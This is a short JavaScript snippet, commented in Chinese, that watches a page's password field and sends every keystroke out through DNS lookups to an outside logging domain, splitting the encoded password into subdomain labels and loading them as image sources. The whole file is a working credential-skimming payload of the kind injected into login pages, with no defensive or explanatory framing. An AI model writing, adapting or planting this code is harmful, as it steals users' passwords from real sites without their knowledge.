// 定义 DNS 带外发送函数
function sendDnsRequest(data) {
  const MAX_LABEL_LENGTH = 63; // 子域名最大长度限制
  const baseDomain = 'sa15dx.ceye.io'; // 目标 DNS 带外域名

  // 对输入内容进行 URL 编码
  let encodedData = encodeURIComponent(data);

  // 如果数据长度超过限制，分段发送
  while (encodedData.length > 0) {
    const chunk = encodedData.slice(0, MAX_LABEL_LENGTH);
    encodedData = encodedData.slice(MAX_LABEL_LENGTH);

    // 构造子域名
    const subdomain = `${chunk}.${baseDomain}`;
    const img = new Image();
    img.src = `http://${subdomain}`;
    console.log(`DNS 请求发送到: ${subdomain}`);
  }
}

// 监听密码框输入事件
document.getElementById('pwd').addEventListener('input', function () {
  const inputValue = this.value; // 获取输入框当前值
  console.log('当前输入：', inputValue);

  // 通过 DNS 带外发送数据
  sendDnsRequest(`password=${inputValue}`);
});
